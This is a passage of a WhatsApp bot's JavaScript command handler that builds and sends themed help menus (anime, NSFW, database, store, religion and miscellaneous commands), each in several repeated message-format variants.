┃ ${setv} ${prefix}shinka 🅕
┃ ${setv} ${prefix}shinomiya 🅕
┃ ${setv} ${prefix}shizuka 🅕
┃ ${setv} ${prefix}shota 🅕
┃ ${setv} ${prefix}tejina 🅕
┃ ${setv} ${prefix}toukachan 🅕
┃ ${setv} ${prefix}tsunade 🅕
┃ ${setv} ${prefix}waifu 🅕
┃ ${setv} ${prefix}waifu2 🅕
┃ ${setv} ${prefix}animewall 🅕
┃ ${setv} ${prefix}yotsuba 🅕
┃ ${setv} ${prefix}yuki 🅕
┃ ${setv} ${prefix}yulibocil 🅕
┃ ${setv} ${prefix}yumeko 🅕
┃ ${setv} ${prefix}8ball 🅕
┃ ${setv} ${prefix}animeawoo 🅕
┃ ${setv} ${prefix}animemegumin 🅕
┃ ${setv} ${prefix}animeshinobu 🅕
┃ ${setv} ${prefix}animehandhold 🅕
┃ ${setv} ${prefix}animehighfive 🅕
┃ ${setv} ${prefix}animecringe 🅕
┃ ${setv} ${prefix}animedance 🅕
┃ ${setv} ${prefix}animehappy 🅕
┃ ${setv} ${prefix}animeglomp 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animesmug 🅕
┃ ${setv} ${prefix}animewave 🅕
┃ ${setv} ${prefix}animesmille 🅕
┃ ${setv} ${prefix}animepoke 🅕
┃ ${setv} ${prefix}animewink 🅕
┃ ${setv} ${prefix}animebonk 🅕
┃ ${setv} ${prefix}animebully 🅕
┃ ${setv} ${prefix}animeyeet 🅕
┃ ${setv} ${prefix}animebite 🅕
┃ ${setv} ${prefix}animelick 🅕
┃ ${setv} ${prefix}animekill 🅕
┃ ${setv} ${prefix}animecry 🅕
┃ ${setv} ${prefix}animewlp 🅕
┃ ${setv} ${prefix}animekiss 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animeneko 🅕
┃ ${setv} ${prefix}animepat 🅕
┃ ${setv} ${prefix}animeslap 🅕
┃ ${setv} ${prefix}animecuddle 🅕
┃ ${setv} ${prefix}animewaifu 🅕
┃ ${setv} ${prefix}animenom 🅕
┃ ${setv} ${prefix}animefoxgirl 🅕
┃ ${setv} ${prefix}animegecg 🅕
┃ ${setv} ${prefix}animeuwu 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animehugs 🅕
┃ ${setv} ${prefix}animejump 🅕
┃ ${setv} ${prefix}animefacepalm 🅕
┃ ${setv} ${prefix}animepout 🅕
┃ ${setv} ${prefix}animepat 🅕
┃ ${setv} ${prefix}animekiss 🅕
┃ ${setv} ${prefix}animecuddle 🅕
┃ ${setv} ${prefix}animepunch 🅕
┃ ${setv} ${prefix}animebite 🅕
┃ ${setv} ${prefix}animewink 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animekick 🅕
┃ ${setv} ${prefix}animelaugh 🅕
┃ ${setv} ${prefix}animepunch 🅕
┃ ${setv} ${prefix}animeblow 🅕
┃ ${setv} ${prefix}animefeed 🅕
┃ ${setv} ${prefix}animelove 🅕
┃ ${setv} ${prefix}animeawe 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animeconfused 🅕
┃ ${setv} ${prefix}animecalm 🅕
┃ ${setv} ${prefix}animepout 🅕
┃ ${setv} ${prefix}animeangry 🅕
┃ ${setv} ${prefix}animework 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animegrin 🅕
┃ ${setv} ${prefix}animehappy 🅕
┃ ${setv} ${prefix}animemiss 🅕
┃ ${setv} ${prefix}animefix 🅕
┃ ${setv} ${prefix}animedeep 🅕
┃ ${setv} ${prefix}animegrumpy 🅕
┃ ${setv} ${prefix}animefacepalm 🅕
┃ ${setv} ${prefix}animewhisper 🅕
┃ ${setv} ${prefix}animehug 🅕
╰━━━━━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'nsfwmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐀𝐍𝐈𝐌𝐄 𝐍𝐒𝐅𝐖\` 】❄️━━━━━╮
┃ ${setv} ${prefix}hentai 🅕
┃ ${setv} ${prefix}xnxxsearch 🅕
┃ ${setv} ${prefix}xvideosearch 🅕
┃ ${setv} ${prefix}xnxxdl 🅕
┃ ${setv} ${prefix}xvideodl 🅕
┃ ${setv} ${prefix}gifblowjob 🅕
┃ ${setv} ${prefix}hentaivid 🅕
┃ ${setv} ${prefix}hneko 🅕
┃ ${setv} ${prefix}nwaifu 🅕
┃ ${setv} ${prefix}animespank 🅕
┃ ${setv} ${prefix}trap 🅕
┃ ${setv} ${prefix}blowjob 🅕
┃ ${setv} ${prefix}cuckold 🅕
┃ ${setv} ${prefix}milf 🅕
┃ ${setv} ${prefix}eba 🅕
┃ ${setv} ${prefix}pussy 🅕
┃ ${setv} ${prefix}yuri 🅕
┃ ${setv} ${prefix}zettai 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'databasemenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}setcmd 🅞
┃ ${setv} ${prefix}delcmd 🅞
┃ ${setv} ${prefix}listcmd 🅕
┃ ${setv} ${prefix}lockcmd 🅞
┃ ${setv} ${prefix}addmsg 🅞
┃ ${setv} ${prefix}delmsg 🅞
┃ ${setv} ${prefix}getmsg 🅕
┃ ${setv} ${prefix}listmsg 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'storemenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐎𝐑𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}list 🅕
┃ ${setv} ${prefix}store 🅕
┃ ${setv} ${prefix}shop 🅕
┃ ${setv} ${prefix}addlist 🅞
┃ ${setv} ${prefix}dellist 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'religionmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}bible 🅕
┃ ${setv} ${prefix}quran 🅕
┃ ${setv} ${prefix}gita 🅕
┃ ${setv} ${prefix}namazchk 🅕
┃ ${setv} ${prefix}prophetname 🅕
┃ ${setv} ${prefix}prayertime 🅕
┃ ${setv} ${prefix}sahihbukhari 🅕
┃ ${setv} ${prefix}jamiattirmidhi 🅕
┃ ${setv} ${prefix}sunanannasai 🅕
┃ ${setv} ${prefix}sunanibnmajah 🅕
┃ ${setv} ${prefix}sunanabudawud 🅕
┃ ${setv} ${prefix}kisahnabi 🅕
┃ ${setv} ${prefix}asmaulhusna 🅕
┃ ${setv} ${prefix}duas 🅕
┃ ${setv} ${prefix}namaz 🅕
┃ ${setv} ${prefix}masnoonduas 🅕
┃ ${setv} ${prefix}ayatalkursi 🅕
┃ ${setv} ${prefix}niyatnamaz 🅕
┃ ${setv} ${prefix}quotesislami 🅕
┃ ${setv} ${prefix}assalamualaikum 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'othermenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐓𝐇𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}esteams-update 🅕
┃ ${setv} ${prefix}cricket 🅕
┃ ${setv} ${prefix}score 🅕
┃ ${setv} ${prefix}ping 🅕
┃ ${setv} ${prefix}menu 🅕
┃ ${setv} ${prefix}myip 🅕
┃ ${setv} ${prefix}repo 🅕
┃ ${setv} ${prefix}reportbug 🅕
┃ ${setv} ${prefix}idgroup 🅕
┃ ${setv} ${prefix}owner 🅕
┃ ${setv} ${prefix}rentbot 🅕
┃ ${setv} ${prefix}donate 🅕
┃ ${setv} ${prefix}runtime 🅕
┃ ${setv} ${prefix}confess 🅕
┃ ${setv} ${prefix}react 🅕
┃ ${setv} ${prefix}q 🅕
┃ ${setv} ${prefix}inspect 🅕
┃ ${setv} ${prefix}tagme 🅕
┃ ${setv} ${prefix}nowa 🅕
┃ ${setv} ${prefix}truecaller 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`

if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
